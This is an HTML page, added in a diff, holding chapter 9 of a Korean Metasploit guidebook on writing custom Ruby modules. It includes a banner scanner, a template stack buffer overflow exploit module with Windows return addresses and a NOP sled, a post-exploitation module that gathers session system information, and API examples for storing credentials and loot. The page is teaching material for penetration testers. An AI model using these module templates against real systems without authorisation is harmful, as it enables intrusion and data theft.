@@ -1,0 +1,603 @@
+<!doctype html>
+<html lang="ko">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Chapter 09 — 커스텀 모듈 개발 | Metasploit 가이드북</title>
+    <link rel="stylesheet" href="../css/style.css" />
+  </head>
+  <body>
+    <div class="reading-progress"><div class="reading-progress-bar"></div></div>
+    <aside class="sidebar">
+      <div class="sidebar-logo">
+        <div class="logo-icon">
+          <svg
+            width="22"
+            height="22"
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="currentColor"
+            stroke-width="2"
+          >
+            <path d="M12 2L2 7l10 5 10-5-10-5z" />
+            <path d="M2 17l10 5 10-5" />
+            <path d="M2 12l10 5 10-5" />
+          </svg>
+          Metasploit 가이드북
+        </div>
+        <p>침투 테스트 완전 정복</p>
+      </div>
+      <nav class="sidebar-nav">
+        <div class="nav-section-label">시작하기</div>
+        <a href="../index.html"
+          ><span class="nav-num">00</span> 목차 &amp; 개요</a
+        >
+        <a href="chapter1.html"
+          ><span class="nav-num">01</span> Metasploit이란?</a
+        >
+        <a href="chapter2.html"
+          ><span class="nav-num">02</span> 설치 &amp; 환경 구성</a
+        >
+        <div class="nav-section-label">핵심 개념</div>
+        <a href="chapter3.html"
+          ><span class="nav-num">03</span> MSF 콘솔 기초</a
+        >
+        <a href="chapter4.html"
+          ><span class="nav-num">04</span> Exploit &amp; Payload</a
+        >
+        <a href="chapter5.html"
+          ><span class="nav-num">05</span> Meterpreter 완전 정복</a
+        >
+        <div class="nav-section-label">실전 기술</div>
+        <a href="chapter6.html"
+          ><span class="nav-num">06</span> 정보 수집 &amp; 스캔</a
+        >
+        <a href="chapter7.html"
+          ><span class="nav-num">07</span> 취약점 분석 &amp; 공격</a
+        >
+        <a href="chapter8.html"
+          ><span class="nav-num">08</span> 포스트 익스플로잇</a
+        >
+        <div class="nav-section-label">심화 &amp; 윤리</div>
+        <a href="chapter9.html" class="active"
+          ><span class="nav-num">09</span> 커스텀 모듈 개발</a
+        >
+        <a href="chapter10.html"
+          ><span class="nav-num">10</span> 윤리 &amp; 법적 기준</a
+        >
+      </nav>
+      <div class="sidebar-footer">⚠️ 교육 목적 전용 — 무단 사용 금지</div>
+    </aside>
+    <main class="main">
+      <div class="chapter-header">
+        <div class="chapter-badge">Chapter 09</div>
+        <h1>커스텀 모듈 개발</h1>
+        <p class="subtitle">
+          Ruby로 나만의 Metasploit 모듈 만들기 — Auxiliary 스캐너, Exploit 모듈,
+          Post 모듈의 구조와 MSF API 활용법
+        </p>
+      </div>
+
+      <div class="callout info">
+        <div class="callout-icon">💡</div>
+        <div class="callout-body">
+          <strong>이 챕터의 목표</strong>
+          <p>
+            기존 모듈을 사용하는 것에서 벗어나, 직접 모듈을 작성하여 특수한
+            상황에 대응하고 Metasploit의 강력한 API를 활용할 수 있게 됩니다.
+            Ruby 기초 지식이 있으면 도움이 되지만 필수는 아닙니다.
+          </p>
+        </div>
+      </div>
+
+      <section class="section">
+        <h2>🏗️ MSF 모듈 구조 개요</h2>
+        <p>
+          Metasploit 모듈은 모두 Ruby로 작성되며, 공통 믹스인(Mixin) 체계를
+          상속받아 일관된 인터페이스를 제공합니다. 모듈 유형에 따라 상속받는
+          기반 클래스가 다릅니다.
+        </p>
+
+        <div
+          style="
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin: 1.5rem 0;
+          "
+        >
+          <div class="callout tip" style="margin: 0">
+            <div class="callout-icon">📁</div>
+            <div class="callout-body">
+              <strong>모듈 저장 위치</strong>
+              <p style="font-size: 0.85rem; margin-top: 0.4rem">
+                커스텀 모듈은 MSF 코어 디렉토리가 아닌
+                <code>~/.msf4/modules/</code>에 저장하세요. MSF 업데이트 시
+                덮어씌워지지 않습니다.
+              </p>
+            </div>
+          </div>
+          <div class="callout info" style="margin: 0">
+            <div class="callout-icon">🔄</div>
+            <div class="callout-body">
+              <strong>모듈 불러오기</strong>
+              <p style="font-size: 0.85rem; margin-top: 0.4rem">
+                파일 저장 후 <code>reload_all</code> 또는
+                <code>loadpath ~/.msf4/modules</code> 명령으로 MSF에 즉시
+                반영됩니다.
+              </p>
+            </div>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-label badge-info"
+              >📂 커스텀 모듈 디렉토리 구조</span
+            ><button class="copy-btn">복사</button>
+          </div>
+          <pre><code>~/.msf4/modules/
+├── auxiliary/
+│   ├── scanner/      ← 스캐너 모듈
+│   └── gather/       ← 정보 수집 모듈
+├── exploits/
+│   ├── linux/
+│   └── windows/
+├── post/
+│   ├── linux/
+│   └── windows/
+└── payloads/</code></pre>
+        </div>
+      </section>
+
+      <section class="section">
+        <h2>🔧 Auxiliary 모듈 작성</h2>
+        <p>
+          가장 간단한 형태인 Auxiliary 모듈부터 시작합니다. 아래는 특정 포트가
+          열려있는지 확인하고 배너를 가져오는 스캐너 모듈입니다.
+        </p>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-label badge-real"
+              >💎 simple_banner_scanner.rb</span
+            ><button class="copy-btn">복사</button>
+          </div>
+          <pre><code><span class="cm">##
+# 커스텀 배너 그래버 모듈
+# 저장 위치: ~/.msf4/modules/auxiliary/scanner/simple_banner_scanner.rb
+##</span>
+
+<span class="kw">require</span> <span class="st">'msf/core'</span>
+
+<span class="kw">class</span> <span class="fn">MetasploitModule</span> < <span class="fn">Msf::Auxiliary</span>
+  <span class="cm"># Mixin 포함: TCP 소켓, 스캐너 기능</span>
+  <span class="kw">include</span> <span class="fn">Msf::Exploit::Remote::Tcp</span>
+  <span class="kw">include</span> <span class="fn">Msf::Auxiliary::Scanner</span>
+  <span class="kw">include</span> <span class="fn">Msf::Auxiliary::Report</span>
+
+  <span class="kw">def</span> <span class="fn">initialize</span>(info = {})
+    <span class="kw">super</span>(<span class="fn">update_info</span>(info,
+      <span class="st">'Name'</span>        => <span class="st">'Simple Banner Grabber'</span>,
+      <span class="st">'Description'</span> => <span class="st">'연결 후 배너를 수집하는 간단한 스캐너'</span>,
+      <span class="st">'Author'</span>      => [<span class="st">'Your Name'</span>],
+      <span class="st">'License'</span>     => <span class="fn">MSF_LICENSE</span>
+    ))
+
+    <span class="cm"># 옵션 등록</span>
+    <span class="fn">register_options</span>([
+      <span class="fn">Opt::RPORT</span>(<span class="nm">80</span>),
+      <span class="fn">OptInt</span>.new(<span class="st">'TIMEOUT'</span>, [<span class="kw">true</span>, <span class="st">'연결 타임아웃(초)'</span>, <span class="nm">10</span>]),
+      <span class="fn">OptString</span>.new(<span class="st">'SEND_DATA'</span>, [<span class="kw">false</span>, <span class="st">'전송할 문자열'</span>, <span class="st">'HEAD / HTTP/1.0\r\n\r\n'</span>])
+    ])
+  <span class="kw">end</span>
+
+  <span class="cm"># 스캐너 각 호스트에 대해 실행되는 메서드</span>
+  <span class="kw">def</span> <span class="fn">run_host</span>(ip)
+    <span class="kw">begin</span>
+      <span class="cm"># TCP 연결</span>
+      <span class="fn">connect</span>
+
+      <span class="cm"># 데이터 전송</span>
+      sock.<span class="fn">put</span>(datastore[<span class="st">'SEND_DATA'</span>]) <span class="kw">if</span> datastore[<span class="st">'SEND_DATA'</span>]
+
+      <span class="cm"># 응답 수신</span>
+      banner = sock.<span class="fn">get_once</span>(-<span class="nm">1</span>, datastore[<span class="st">'TIMEOUT'</span>])
+
+      <span class="kw">if</span> banner
+        banner = banner.<span class="fn">gsub</span>(<span class="st">/[\r\n]+/</span>, <span class="st">' '</span>).<span class="fn">strip</span>[<span class="nm">0</span>..<span class="nm">200</span>]
+        <span class="fn">print_good</span>(<span class="st">"#{ip}:#{rport} — #{banner}"</span>)
+
+        <span class="cm"># 결과를 MSF DB에 저장</span>
+        <span class="fn">report_service</span>(
+          <span class="st">host:</span>  ip,
+          <span class="st">port:</span>  rport,
+          <span class="st">proto:</span> <span class="st">'tcp'</span>,
+          <span class="st">info:</span>  banner
+        )
+      <span class="kw">else</span>
+        <span class="fn">print_status</span>(<span class="st">"#{ip}:#{rport} — 응답 없음"</span>)
+      <span class="kw">end</span>
+
+    <span class="kw">rescue</span> <span class="fn">::Rex::ConnectionRefused</span>
+      <span class="fn">print_error</span>(<span class="st">"#{ip}:#{rport} — 연결 거부"</span>)
+    <span class="kw">rescue</span> <span class="fn">::Rex::ConnectionTimeout</span>
+      <span class="fn">print_error</span>(<span class="st">"#{ip}:#{rport} — 타임아웃"</span>)
+    <span class="kw">ensure</span>
+      <span class="fn">disconnect</span>
+    <span class="kw">end</span>
+  <span class="kw">end</span>
+<span class="kw">end</span></code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-label badge-real">▶️ 커스텀 모듈 사용</span
+            ><button class="copy-btn">복사</button>
+          </div>
+          <pre><code><span class="cm"># 모듈 파일 저장 후 MSF에서 로드</span>
+msf6 > reload_all
+<span class="st">[*] Reloading modules from all module paths...</span>
+<span class="st">[+] Loaded 1 new modules</span>
+
+msf6 > use auxiliary/scanner/simple_banner_scanner
+msf6 auxiliary(simple_banner_scanner) > set RHOSTS 192.168.56.0/24
+msf6 auxiliary(simple_banner_scanner) > set RPORT 22
+msf6 auxiliary(simple_banner_scanner) > set THREADS 20
+msf6 auxiliary(simple_banner_scanner) > run
+
+<span class="st">[+] 192.168.56.101:22 — SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1</span>
+<span class="st">[+] 192.168.56.102:22 — SSH-2.0-OpenSSH_7.4</span></code></pre>
+        </div>
+      </section>
+
+      <section class="section">
+        <h2>💥 Exploit 모듈 작성</h2>
+        <p>
+          실제 취약점을 익스플로잇하는 모듈입니다. 아래는 스택 버퍼 오버플로우를
+          이용한 간단한 TCP 익스플로잇 모듈 구조입니다.
+        </p>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-label badge-real"
+              >💎 custom_bof_exploit.rb — 기본 구조</span
+            ><button class="copy-btn">복사</button>
+          </div>
+          <pre><code><span class="cm">##
+# 커스텀 스택 BOF 익스플로잇 모듈 (구조 예시)
+##</span>
+<span class="kw">require</span> <span class="st">'msf/core'</span>
+
+<span class="kw">class</span> <span class="fn">MetasploitModule</span> < <span class="fn">Msf::Exploit::Remote</span>
+  <span class="fn">Rank</span> = <span class="fn">NormalRanking</span>
+
+  <span class="kw">include</span> <span class="fn">Msf::Exploit::Remote::Tcp</span>
+
+  <span class="kw">def</span> <span class="fn">initialize</span>(info = {})
+    <span class="kw">super</span>(<span class="fn">update_info</span>(info,
+      <span class="st">'Name'</span>           => <span class="st">'My Custom Buffer Overflow'</span>,
+      <span class="st">'Description'</span>    => <span class="st">'Custom vulnerable service BOF exploit'</span>,
+      <span class="st">'Author'</span>         => [<span class="st">'Your Name'</span>],
+      <span class="st">'License'</span>        => <span class="fn">MSF_LICENSE</span>,
+      <span class="st">'Platform'</span>       => <span class="st">'win'</span>,
+      <span class="st">'Targets'</span> => [
+        [<span class="st">'Windows XP SP3'</span>, { <span class="st">'Ret'</span> => <span class="nm">0x7C941EED</span> }],
+        [<span class="st">'Windows 7 SP1'</span>,  { <span class="st">'Ret'</span> => <span class="nm">0x6250AF11</span> }],
+      ],
+      <span class="st">'DefaultTarget'</span>  => <span class="nm">0</span>,
+      <span class="st">'References'</span> => [
+        [<span class="st">'CVE'</span>, <span class="st">'2024-XXXXX'</span>],
+      ],
+      <span class="st">'DisclosureDate'</span> => <span class="st">'2024-01-01'</span>
+    ))
+
+    <span class="fn">register_options</span>([<span class="fn">Opt::RPORT</span>(<span class="nm">9999</span>)])
+  <span class="kw">end</span>
+
+  <span class="kw">def</span> <span class="fn">exploit</span>
+    <span class="cm"># 페이로드 생성</span>
+    buf  = <span class="st">"A"</span> * <span class="nm">2006</span>                   <span class="cm"># EIP까지 오프셋</span>
+    buf += [target[<span class="st">'Ret'</span>]].<span class="fn">pack</span>(<span class="st">'V'</span>)  <span class="cm"># EIP 덮어쓰기 (JMP ESP 주소)</span>
+    buf += <span class="fn">make_nops</span>(<span class="nm">16</span>)               <span class="cm"># NOP sled</span>
+    buf += payload.encoded                <span class="cm"># 쉘코드</span>
+
+    <span class="fn">print_status</span>(<span class="st">"Sending buffer (#{buf.length} bytes)..."</span>)
+
+    <span class="fn">connect</span>
+    sock.<span class="fn">put</span>(buf)
+    handler   <span class="cm"># 연결 수신 대기</span>
+    <span class="fn">disconnect</span>
+  <span class="kw">end</span>
+<span class="kw">end</span></code></pre>
+        </div>
+
+        <div class="callout tip">
+          <div class="callout-icon">🛠️</div>
+          <div class="callout-body">
+            <strong>MSF 패턴 생성으로 오프셋 찾기</strong>
+            <p>
+              EIP까지의 정확한 오프셋을 구하려면
+              <code>msf-pattern_create -l 3000</code>으로 패턴을 생성하고,
+              크래시 주소를 <code>msf-pattern_offset -q &lt;주소&gt;</code>로
+              분석합니다.
+            </p>
+          </div>
+        </div>
+      </section>
+
+      <section class="section">
+        <h2>🔧 Post 모듈 작성</h2>
+        <p>
+          이미 획득한 세션에서 실행되는 Post 모듈입니다. 아래는 시스템 정보를
+          자동으로 수집하여 파일로 저장하는 예시입니다.
+        </p>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-label badge-real"
+              >💎 gather_sysinfo.rb — Post 모듈</span
+            ><button class="copy-btn">복사</button>
+          </div>
+          <pre><code><span class="cm">##
+# 시스템 정보 자동 수집 Post 모듈
+# 저장 위치: ~/.msf4/modules/post/multi/gather/gather_sysinfo.rb
+##</span>
+<span class="kw">require</span> <span class="st">'msf/core'</span>
+
+<span class="kw">class</span> <span class="fn">MetasploitModule</span> < <span class="fn">Msf::Post</span>
+  <span class="kw">include</span> <span class="fn">Msf::Post::File</span>
+  <span class="kw">include</span> <span class="fn">Msf::Post::Windows::Registry</span>  <span class="cm"># Windows 전용</span>
+
+  <span class="kw">def</span> <span class="fn">initialize</span>(info = {})
+    <span class="kw">super</span>(<span class="fn">update_info</span>(info,
+      <span class="st">'Name'</span>        => <span class="st">'Multi Gather System Information'</span>,
+      <span class="st">'Description'</span> => <span class="st">'시스템 기본 정보를 수집하여 로컬에 저장합니다'</span>,
+      <span class="st">'License'</span>     => <span class="fn">MSF_LICENSE</span>,
+      <span class="st">'Author'</span>      => [<span class="st">'Your Name'</span>],
+      <span class="st">'Platform'</span>    => [<span class="st">'win'</span>, <span class="st">'linux'</span>],
+      <span class="st">'SessionTypes'</span> => [<span class="st">'meterpreter'</span>]
+    ))
+  <span class="kw">end</span>
+
+  <span class="kw">def</span> <span class="fn">run</span>
+    <span class="fn">print_status</span>(<span class="st">"수집 시작: #{session.sys.config.sysinfo['Computer']}"</span>)
+
+    report = []
+    report << <span class="st">"=== 시스템 정보 ==="</span>
+    report << <span class="st">"호스트: #{session.sys.config.sysinfo['Computer']}"</span>
+    report << <span class="st">"OS: #{session.sys.config.sysinfo['OS']}"</span>
+    report << <span class="st">"사용자: #{session.sys.config.getuid}"</span>
+    report << <span class="st">""</span>
+
+    <span class="cm"># 네트워크 정보 수집</span>
+    report << <span class="st">"=== 네트워크 인터페이스 ==="</span>
+    session.net.config.interfaces.<span class="fn">each</span> <span class="kw">do</span> |iface|
+      report << <span class="st">"  #{iface.name}: #{iface.addrs.join(', ')}"</span>
+    <span class="kw">end</span>
+
+    <span class="cm"># 실행 중인 프로세스 (처음 10개만)</span>
+    report << <span class="st">""</span>
+    report << <span class="st">"=== 프로세스 목록 (상위 10개) ==="</span>
+    session.sys.process.<span class="fn">get_processes</span>[<span class="nm">0</span>..<span class="nm">9</span>].<span class="fn">each</span> <span class="kw">do</span> |proc|
+      report << <span class="st">"  [#{proc['pid']}] #{proc['name']}"</span>
+    <span class="kw">end</span>
+
+    <span class="cm"># 결과를 로컬 파일에 저장</span>
+    outfile = <span class="st">"#{Msf::Config.log_directory}/sysinfo_#{Time.now.strftime('%Y%m%d_%H%M%S')}.txt"</span>
+    <span class="fn">File.write</span>(outfile, report.<span class="fn">join</span>(<span class="st">"\n"</span>))
+    <span class="fn">print_good</span>(<span class="st">"결과 저장: #{outfile}"</span>)
+  <span class="kw">end</span>
+<span class="kw">end</span></code></pre>
+        </div>
+      </section>
+
+      <section class="section">
+        <h2>🧰 핵심 MSF API 레퍼런스</h2>
+        <p>모듈 개발 시 자주 사용하는 MSF API를 정리합니다.</p>
+
+        <div class="tab-container">
+          <div class="tab-nav">
+            <button class="tab-btn active" data-tab="api-print">
+              출력 메서드
+            </button>
+            <button class="tab-btn" data-tab="api-net">네트워크</button>
+            <button class="tab-btn" data-tab="api-report">DB 저장</button>
+          </div>
+
+          <div class="tab-content active" id="api-print">
+            <div class="code-block">
+              <div class="code-header">
+                <span class="code-label badge-info">💬 출력 메서드</span
+                ><button class="copy-btn">복사</button>
+              </div>
+              <pre><code><span class="cm"># 상태 메시지 (흰색 [*])</span>
+<span class="fn">print_status</span>(<span class="st">"스캔 중..."</span>)
+
+<span class="cm"># 성공 메시지 (녹색 [+])</span>
+<span class="fn">print_good</span>(<span class="st">"취약점 발견!"</span>)
+
+<span class="cm"># 경고 메시지 (노란색 [!])</span>
+<span class="fn">print_warning</span>(<span class="st">"응답이 느립니다"</span>)
+
+<span class="cm"># 에러 메시지 (빨간색 [-])</span>
+<span class="fn">print_error</span>(<span class="st">"연결 실패"</span>)
+
+<span class="cm"># 디버그 메시지 (verbose 모드에서만 출력)</span>
+<span class="fn">vprint_status</span>(<span class="st">"디버그 정보"</span>)
+<span class="fn">vprint_good</span>(<span class="st">"상세 결과"</span>)
+
+<span class="cm"># 라인 직접 출력</span>
+<span class="fn">print_line</span>(<span class="st">"일반 텍스트"</span>)</code></pre>
+            </div>
+          </div>
+
+          <div class="tab-content" id="api-net">
+            <div class="code-block">
+              <div class="code-header">
+                <span class="code-label badge-info">🌐 네트워크 API</span
+                ><button class="copy-btn">복사</button>
+              </div>
+              <pre><code><span class="cm"># TCP 연결 (Msf::Exploit::Remote::Tcp 포함 시)</span>
+<span class="fn">connect</span>                    <span class="cm"># RHOST:RPORT로 연결</span>
+<span class="fn">connect</span>(<span class="kw">true</span>, {           <span class="cm"># 옵션 지정</span>
+  <span class="st">'RHOST'</span> => <span class="st">'10.10.10.1'</span>,
+  <span class="st">'RPORT'</span> => <span class="nm">443</span>
+})
+sock.<span class="fn">put</span>(data)            <span class="cm"># 데이터 전송</span>
+sock.<span class="fn">get_once</span>             <span class="cm"># 응답 수신</span>
+sock.<span class="fn">get_once</span>(-<span class="nm">1</span>, timeout) <span class="cm"># 타임아웃 지정</span>
+<span class="fn">disconnect</span>                 <span class="cm"># 연결 종료</span>
+
+<span class="cm"># UDP (Msf::Exploit::Remote::Udp 포함 시)</span>
+<span class="fn">udp_sock</span>.<span class="fn">sendto</span>(data, host, port)
+<span class="fn">udp_sock</span>.<span class="fn">recvfrom</span>(timeout)
+
+<span class="cm"># HTTP (Msf::Exploit::Remote::HttpClient 포함 시)</span>
+res = <span class="fn">send_request_cgi</span>({
+  <span class="st">'method'</span>  => <span class="st">'GET'</span>,
+  <span class="st">'uri'</span>     => <span class="st">'/admin/'</span>,
+  <span class="st">'headers'</span> => { <span class="st">'User-Agent'</span> => <span class="st">'Mozilla/5.0'</span> }
+})
+<span class="fn">print_good</span>(res.body) <span class="kw">if</span> res && res.code == <span class="nm">200</span></code></pre>
+            </div>
+          </div>
+
+          <div class="tab-content" id="api-report">
+            <div class="code-block">
+              <div class="code-header">
+                <span class="code-label badge-info">💾 DB 저장 API</span
+                ><button class="copy-btn">복사</button>
+              </div>
+              <pre><code><span class="cm"># 호스트 정보 저장</span>
+<span class="fn">report_host</span>(<span class="st">host:</span> ip, <span class="st">os_name:</span> <span class="st">'Windows'</span>, <span class="st">os_sp:</span> <span class="st">'SP3'</span>)
+
+<span class="cm"># 서비스 정보 저장</span>
+<span class="fn">report_service</span>(
+  <span class="st">host:</span>  ip,
+  <span class="st">port:</span>  rport,
+  <span class="st">proto:</span> <span class="st">'tcp'</span>,
+  <span class="st">name:</span>  <span class="st">'http'</span>,
+  <span class="st">info:</span>  <span class="st">'Apache 2.4.41'</span>
+)
+
+<span class="cm"># 취약점 저장</span>
+<span class="fn">report_vuln</span>(
+  <span class="st">host:</span>  ip,
+  <span class="st">name:</span>  <span class="st">'EternalBlue'</span>,
+  <span class="st">info:</span>  <span class="st">'MS17-010 SMB RCE'</span>,
+  <span class="st">refs:</span>  <span class="fn">references</span>
+)
+
+<span class="cm"># 자격증명 저장</span>
+<span class="fn">store_valid_credential</span>(
+  <span class="st">user:</span>   <span class="st">'admin'</span>,
+  <span class="st">private:</span> <span class="st">'password123'</span>,
+  <span class="st">private_type:</span> :password
+)
+
+<span class="cm"># 수집 결과 파일 저장</span>
+<span class="fn">store_loot</span>(
+  <span class="st">'custom.data'</span>,   <span class="cm"># loot type</span>
+  <span class="st">'text/plain'</span>,    <span class="cm"># content type</span>
+  ip,              <span class="cm"># 호스트</span>
+  data,            <span class="cm"># 내용</span>
+  <span class="st">'loot.txt'</span>       <span class="cm"># 파일명</span>
+)</code></pre>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section class="section">
+        <h2>🧪 모듈 디버깅 팁</h2>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-label badge-real"
+              >🐛 개발 및 디버깅 워크플로우</span
+            ><button class="copy-btn">복사</button>
+          </div>
+          <pre><code><span class="cm"># 1. Ruby 문법 오류 사전 검사</span>
+$ ruby -c ~/.msf4/modules/auxiliary/scanner/my_module.rb
+Syntax OK
+
+<span class="cm"># 2. MSF에서 모듈 로드 후 info 확인</span>
+msf6 > reload_all
+msf6 > use auxiliary/scanner/my_module
+msf6 auxiliary(my_module) > info
+
+<span class="cm"># 3. verbose 모드로 실행</span>
+msf6 auxiliary(my_module) > set VERBOSE true
+msf6 auxiliary(my_module) > run
+
+<span class="cm"># 4. pry 디버거 삽입 (대화형 디버깅)</span>
+<span class="cm"># 코드 내 원하는 위치에 삽입:</span>
+require <span class="st">'pry'</span>; binding.pry
+
+<span class="cm"># 5. MSF 로그 확인</span>
+$ tail -f ~/.msf4/logs/framework.log</code></pre>
+        </div>
+
+        <div class="callout tip">
+          <div class="callout-icon">📚</div>
+          <div class="callout-body">
+            <strong>공식 모듈 코드로 배우기</strong>
+            <p>
+              가장 빠른 학습법은 기존 MSF 모듈 코드를 읽는 것입니다.
+              <code>/usr/share/metasploit-framework/modules/</code> 디렉토리에서
+              비슷한 용도의 모듈을 찾아 구조를 분석하세요. GitHub의
+              <code>rapid7/metasploit-framework</code> 저장소도 훌륭한 참고
+              자료입니다.
+            </p>
+          </div>
+        </div>
+      </section>
+
+      <div
+        style="
+          display: flex;
+          justify-content: space-between;
+          margin-top: 40px;
+          padding-top: 24px;
+          border-top: 1px solid var(--border);
+        "
+      >
+        <a
+          href="chapter8.html"
+          style="
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 24px;
+            background: var(--bg-card2);
+            color: var(--text-muted);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            text-decoration: none;
+            font-size: 14px;
+          "
+          >← Chapter 08: 포스트 익스플로잇</a
+        >
+        <a
+          href="chapter10.html"
+          style="
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 24px;
+            background: var(--accent-soft);
+            color: var(--accent2);
+            border: 1px solid var(--accent);
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+          "
+          >Chapter 10: 윤리 &amp; 법적 기준 →</a
+        >
+      </div>
+    </main>
+    <script src="../js/main.js"></script>
+  </body>
+</html>
